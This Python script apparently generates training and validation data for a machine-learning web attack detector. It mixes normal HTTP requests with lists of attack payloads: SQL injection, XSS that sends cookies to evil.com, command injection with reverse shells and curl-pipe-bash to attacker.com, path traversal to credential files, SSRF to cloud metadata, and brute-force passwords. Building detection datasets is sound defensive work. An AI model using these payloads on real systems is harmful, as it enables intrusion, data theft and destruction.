import csv
import random
import string
from pathlib import Path

DATA_DIR = Path(__file__).parent.parent / "data"

NORMAL_ENDPOINTS = [
    "/api/products", "/api/orders", "/api/users",
    "/api/login", "/api/data", "/api/search",
    "/dashboard", "/profile", "/settings",
]

NORMAL_METHODS = ["GET", "POST", "PUT", "DELETE"]

NORMAL_PARAMS = [
    "category=electronics&page=1",
    "search=laptop&sort=price",
    "user=ahmed&filter=active",
    "limit=20&offset=0",
    "id=123&format=json",
    "q=smartphone&brand=samsung",
    "date=2024-01-15&type=order",
    "status=pending&priority=high",
]

NORMAL_BODIES = [
    '{"username": "ahmed_hassan", "password": "SecurePass123!"}',
    '{"name": "Sara Ali", "email": "sara@company.com", "role": "user"}',
    '{"product_id": 42, "quantity": 2, "address": "Cairo, Egypt"}',
    '{"message": "I need help with my order", "priority": "normal"}',
    '{"category": "phones", "max_price": 5000, "brand": "Apple"}',
    '{"user_id": 15, "action": "view", "page": "dashboard"}',
    '{"search": "wireless headphones", "in_stock": true}',
    '{"order_id": "ORD-2024-001", "status": "processing"}',
    '{"feedback": "Great product, fast delivery!", "rating": 5}',
    '{"department": "IT", "full_name": "Omar Khalid", "phone": "01012345678"}',
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0",
    "PostmanRuntime/7.36.0",
    "axios/1.6.0",
    "python-requests/2.31.0",
]


def generate_normal_http_request():
    endpoint = random.choice(NORMAL_ENDPOINTS)
    method = random.choice(NORMAL_METHODS)
    param = random.choice(NORMAL_PARAMS)
    ua = random.choice(USER_AGENTS)
    body = random.choice(NORMAL_BODIES)

    templates = [
        f"{method} {endpoint}?{param}",
        f"{method} {endpoint} User-Agent: {ua}",
        f"POST {endpoint} body={body}",
        f"GET {endpoint}/{random.randint(1, 9999)}",
        f"{body}",
        f"{param}",
        f"search={random.choice(['laptop', 'phone', 'tablet', 'headphones'])}",
        f"user_id={random.randint(1, 1000)}&action=view",
        f"page={random.randint(1, 50)}&limit={random.choice([10, 20, 50])}",
        f"Authorization: Bearer validtoken{random.randint(100, 999)}",
        f"Content-Type: application/json {body}",
        f"name={random.choice(['Ahmed', 'Sara', 'Omar', 'Lina', 'Nour'])} "
        f"email={random.randint(1,999)}@mail.com",
        f"order_id=ORD-{random.randint(1000,9999)} status=confirmed",
        f"category={random.choice(['phones','laptops','audio','tablets'])} "
        f"page={random.randint(1,10)}",
        f"GET /health HTTP/1.1",
        f"GET /api/products HTTP/1.1 Accept: application/json",
    ]
    return random.choice(templates)


SQL_BASIC = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin'#",
    "' OR 'x'='x",
    "1' OR '1'='1' /*",
    "') OR ('1'='1",
    "' OR 1=1 LIMIT 1--",
    "1 OR 1=1",
    "' OR ''='",
]

SQL_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1 UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 UNION SELECT @@version,NULL--",
    "' UNION SELECT 1,table_name FROM information_schema.tables--",
    "1 UNION SELECT user(),database()--",
]

SQL_BLIND = [
    "1 AND SLEEP(5)--",
    "1' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=CONVERT(int,@@version)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",
    "1; IF (1=1) WAITFOR DELAY '0:0:5'--",
]

SQL_STACKED = [
    "1; DROP TABLE users--",
    "'; DELETE FROM orders WHERE 1=1--",
    "1'; INSERT INTO users VALUES('hacker','pass')--",
    "'; UPDATE users SET password='hacked' WHERE 1=1--",
    "1'; EXEC xp_cmdshell('whoami')--",
    "'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
]

SQL_EVASION = [
    "1'/**/OR/**/1=1--",
    "1' /*!OR*/ 1=1--",
    "1'\tOR\t1=1--",
    "1'%09OR%091=1--",
    "1' OR 0x31=0x31--",
    "1' oR '1'='1",
    "1'||'1'='1",
    "id=1&id=2 UNION SELECT 1,2--",
    "1' AND 1=1 UNION SELECT 1-- -",
    "' OR 1=1 INTO OUTFILE '/tmp/x'--",
]


def get_sql_payload():
    all_payloads = (
        SQL_BASIC * 3 + SQL_UNION * 2 + SQL_BLIND * 2 + SQL_STACKED + SQL_EVASION * 2
    )
    payload = random.choice(all_payloads)
    contexts = [
        f"id={payload}", f"username={payload}", f"search={payload}",
        f"user={payload}", f"order_id={payload}",
        f"GET /api/users?id={payload}",
        f"POST /api/login username={payload} password=test",
        payload,
    ]
    return random.choice(contexts)


XSS_BASIC = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror='alert(1)'>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",
    "<a href='javascript:alert(1)'>click</a>",
]

XSS_COOKIE_STEAL = [
    "<script>fetch('https://evil.com?c='+document.cookie)</script>",
    "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>",
    "<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>",
    "<script>document.location='https://evil.com/steal?c='+document.cookie</script>",
    "<svg><script>location='https://evil.com?c='+document.cookie</script></svg>",
]

XSS_EVASION = [
    "<ScRiPt>alert(1)</ScRiPt>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<script >alert(1)</script >",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<img src=`javascript:alert(1)`>",
    "<IMG SRC=JaVaScRiPt:alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<div onmouseover=alert(1)>hover</div>",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
]


def get_xss_payload():
    all_payloads = XSS_BASIC * 2 + XSS_COOKIE_STEAL * 2 + XSS_EVASION * 2
    payload = random.choice(all_payloads)
    contexts = [
        f"comment={payload}", f"name={payload}", f"message={payload}",
        f"description={payload}", f"search={payload}", f"title={payload}",
        f"GET /api/search?q={payload}",
        f"POST /api/feedback body={payload}",
        payload,
    ]
    return random.choice(contexts)


CMD_PAYLOADS = [
    "; ls -la", "| cat /etc/passwd", "& whoami", "`id`", "$(whoami)",
    "; cat /etc/shadow", "| uname -a", "; ping -c 4 attacker.com",
    "| wget http://attacker.com/shell.sh", "& ipconfig",
    "; curl http://evil.com/$(cat /etc/passwd | base64)",
    "|| nc -e /bin/sh attacker.com 4444",
    "; python -c 'import socket,subprocess'",
    "& net user hacker Password1 /add",
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "`curl -s http://attacker.com/shell.sh | bash`",
    "$(curl -s http://attacker.com/shell.sh)",
]

def get_cmd_payload():
    payload = random.choice(CMD_PAYLOADS)
    return random.choice([
        f"filename={payload}", f"cmd={payload}", f"exec={payload}",
        f"ping={payload}", f"host={payload}", payload,
        f"POST /api/data body=command{payload}",
    ])


PATH_PAYLOADS = [
    "../../../../etc/passwd", "../../../../etc/shadow",
    "../../../var/www/html/config.php",
    "../../../../proc/self/environ",
    "../../../../var/log/apache2/access.log",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..\..\..\windows\system32\drivers\etc\hosts",
    "/etc/passwd%00", "../../../etc/shadow",
    "php://filter/convert.base64-encode/resource=config.php",
    "file:///etc/passwd",
    "../../.git/config", "../../../.env",
    "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
]

def get_path_payload():
    payload = random.choice(PATH_PAYLOADS)
    return random.choice([
        f"file={payload}", f"path={payload}", f"include={payload}",
        f"GET {payload}", f"GET /api/files?name={payload}", payload,
    ])


SCANNER_PATHS = [
    "GET /admin HTTP/1.1", "GET /wp-admin HTTP/1.1",
    "GET /phpmyadmin HTTP/1.1", "GET /.env HTTP/1.1",
    "GET /config.php HTTP/1.1", "GET /backup.sql HTTP/1.1",
    "GET /.git/config HTTP/1.1", "GET /server-status HTTP/1.1",
    "GET /console HTTP/1.1", "GET /actuator/env HTTP/1.1",
    "GET /api/swagger.json HTTP/1.1", "GET /web.config HTTP/1.1",
    "GET /robots.txt scan probe reconnaissance",
    "GET /wp-admin HTTP/1.1 User-Agent: sqlmap",
    "User-Agent: sqlmap/1.8.3#stable",
    "User-Agent: Nmap Scripting Engine",
    "User-Agent: Nikto/2.5.0",
    "User-Agent: masscan/1.3",
]

def get_scanner_payload():
    return random.choice(SCANNER_PATHS)


BRUTE_TEMPLATES = [
    "username=admin&password={pwd}",
    "username=administrator&password={pwd}",
    "username=root&password={pwd}",
    "username=user&password={pwd}",
    "multiple failed login attempts detected for admin",
    "repeated authentication failure admin account locked",
    "login attempt failed username admin invalid credentials",
    "brute force attempt on login endpoint from single ip",
    "password spray attack detected multiple users",
]

COMMON_PASSWORDS = [
    "123456", "password", "admin123", "admin", "qwerty",
    "letmein", "monkey", "abc123", "batman", "superman",
    "password123", "1234567890",
]

def get_brute_payload():
    template = random.choice(BRUTE_TEMPLATES)
    return template.format(pwd=random.choice(COMMON_PASSWORDS))


SSRF_PAYLOADS = [
    "url=http://127.0.0.1/admin",
    "url=http://localhost:8080",
    "url=http://169.254.169.254/latest/meta-data/",
    "url=http://192.168.1.1",
    "url=http://10.0.0.1",
    "url=http://metadata.google.internal",
    "url=file:///etc/passwd",
    "url=gopher://127.0.0.1:25/",
    "url=dict://127.0.0.1:11211/",
    "fetch=http://internal-service:8080/secret",
    "endpoint=http://localhost:9200/_cat/indices",
]

def get_ssrf_payload():
    return random.choice(SSRF_PAYLOADS)


def generate_dataset(normal_count=2000, attack_count=2000, output_name="ml_training_data.csv"):
    rows = []
    print(f"Generating {normal_count} normal requests...")
    for _ in range(normal_count):
        rows.append({"text": generate_normal_http_request(), "label": 0})

    per_type = attack_count // 7
    remainder = attack_count % 7

    attack_generators = [
        (get_sql_payload, per_type + remainder),
        (get_xss_payload, per_type),
        (get_cmd_payload, per_type),
        (get_path_payload, per_type),
        (get_scanner_payload, per_type),
        (get_brute_payload, per_type),
        (get_ssrf_payload, per_type),
    ]

    print(f"Generating {attack_count} attack samples...")
    for generator, count in attack_generators:
        for _ in range(count):
            rows.append({"text": generator(), "label": 1})

    random.shuffle(rows)

    output_file = DATA_DIR / output_name
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    with open(output_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["text", "label"], quoting=csv.QUOTE_ALL, escapechar='\\')
        writer.writeheader()
        writer.writerows(rows)

    total = len(rows)
    normal = sum(1 for r in rows if r["label"] == 0)
    attacks = sum(1 for r in rows if r["label"] == 1)

    print(f"\nDone: {output_file}")
    print(f"   Total:   {total}")
    print(f"   Normal:  {normal} ({normal/total*100:.1f}%)")
    print(f"   Attacks: {attacks} ({attacks/total*100:.1f}%)")


def generate_validation_dataset(output_name="ml_validation_data.csv"):
    rows = []

    novel_normal = [
        "GET /api/v2/products?filter=price_lt:1000&sort=rating:desc HTTP/1.1",
        "POST /graphql Content-Type: application/json query={user{id,name}}",
        "PUT /api/users/profile Accept-Language: ar-EG,ar;q=0.9",
        "DELETE /api/sessions/current Authorization: Bearer abc123",
        "PATCH /api/orders/ORD-456 body={status:shipped}",
        "GET /api/analytics?from=2024-01-01&to=2024-12-31",
        "POST /api/auth/refresh token=eyJ...",
        "GET /api/notifications?unread=true&limit=10",
        "POST /api/payments body={amount:100,currency:EGP}",
        "GET /api/reports?type=monthly&year=2024",
    ] * 50

    for text in novel_normal:
        rows.append({"text": text, "label": 0})

    novel_attacks = [
        "' AND 1=2 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--",
        "1; EXEC master..xp_cmdshell('dir c:\\')",
        "' GROUP BY columnnames having 1=1--",
        "' HAVING 1=1--",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
        "....\\....\\....\\windows\\system32\\cmd.exe",
        "%252e%252e%252fetc%252fpasswd",
        "url=http://[::1]/admin",
        "url=http://0177.0.0.1/",
        "url=http://2130706433/",
        "file=$(cat /etc/passwd); curl http://evil.com/?d=$file",
        ";{cat,/etc/passwd}",
    ] * 30

    for text in novel_attacks:
        rows.append({"text": text, "label": 1})

    random.shuffle(rows)

    output_file = DATA_DIR / output_name
    with open(output_file, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["text", "label"], quoting=csv.QUOTE_ALL, escapechar='\\')
        writer.writeheader()
        writer.writerows(rows)

    print(f"\nValidation set: {output_file}")
    print(f"   Total: {len(rows)}")


if __name__ == "__main__":
    # تم التعديل: زيادة عدد الـ Normal إلى 3000 ليتفوق على الـ Attacks (2000)
    # لتصبح النسبة تقريباً 60% للبيانات الطبيعية، مما يمنع الموديل من التحيز للهجمات
    generate_dataset(normal_count=3000, attack_count=2000)
    generate_validation_dataset()
